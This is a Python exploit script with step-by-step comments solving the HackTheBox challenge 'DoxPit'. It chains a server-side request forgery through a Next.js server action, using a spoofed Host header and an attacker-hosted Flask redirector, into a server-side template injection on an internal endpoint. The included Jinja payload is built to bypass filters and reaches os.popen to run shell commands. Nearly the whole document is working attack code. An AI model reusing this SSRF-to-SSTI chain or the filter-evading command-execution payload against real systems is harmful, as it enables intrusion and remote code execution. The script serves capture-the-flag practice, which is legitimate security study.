#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox challenge called 'DoxPit'.  
This script exploits a server side request forgery that is then leveraged to exploit a server side template injection on a function that is only accessible internally.

Follow the steps below before running the script:

Step 1: Use a server that is publicly accessible
Step 2: On the publicly accessible server, write the following script and call it "app.py":
    #!/usr/bin/env python3
    from flask import Flask, Response, request, redirect, url_for
    app = Flask(__name__)
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch(path):
        if request.method == 'HEAD':
            resp = Response("")
            resp.headers['Content-Type'] = 'text/x-component'
            return resp
        username="johnwick"
        password="Johnwick3$"
        return redirect(f'http://127.0.0.1:3000/register?username={username}&password={password}')

Step 3: On the public server run the hosted app.py:  flask run --host=0.0.0.0
Step 4: Run the script below
"""  

import requests

def ssrf_ssti():
    proxies={"http":"http://127.0.0.1:8080"}
    url="94.237.49.212:58676"  # Replace Target url
    SSRF_HOST="54.157.213.44:5000"  # Replace with the public server ip where you are hosting the script above
    headers={
        "Host":f"{SSRF_HOST}",    
        "Next-Router-State-Tree":"%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
        "Next-Action":"0b0da34c9bad83debaebc8b90e4d5ec7544ca862",
        "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryKt0dAPqZGN8Wlx98",
    }
    data="""
------WebKitFormBoundaryKt0dAPqZGN8Wlx98
Content-Disposition: form-data; name="1_$ACTION_ID_0b0da34c9bad83debaebc8b90e4d5ec7544ca862"


------WebKitFormBoundaryKt0dAPqZGN8Wlx98
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryKt0dAPqZGN8Wlx98--

    """
    data2 = data.replace("\n", "\r\n")

    response=requests.post(url=f"http://{url}", proxies=proxies, headers=headers, data=data2)
    response_text=response.text
    for line in response_text.splitlines():
        if "token" in line:
            print(line)

ssrf_ssti()

# The above script returns a 'token' value that we will use in the next step.  
# Step 5: Replace the script shown above in step 2 with the below script:
# #!/usr/bin/env python3
#     from flask import Flask, Response, request, redirect, url_for
#     app = Flask(__name__)
#     @app.route('/', defaults={'path': ''})
#     @app.route('/<path:path>')
#     def catch(path):
#         if request.method == 'HEAD':
#             resp = Response("")
#             resp.headers['Content-Type'] = 'text/x-component'
#             return resp
#      token="cbce407b81b2897f3242f1dc1363f52d" # Change the token value
#      directory="{% print(request|attr('application')|attr(request|attr('args')|attr('get')('g'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('b'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('i'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()) %}&g=__globals__&b=__builtins__&i=__import__&gi=__getitem__&cmd=ls+/"  # This format is needed to bypass ssti filters
#       return redirect(f'http://127.0.0.1:3000/home?directory={directory}&token={token}') 
# Step 6: On the public server run the hosted app.py:  flask run --host=0.0.0.0
# Step 7: Run the 'ssrf_ssti' function again
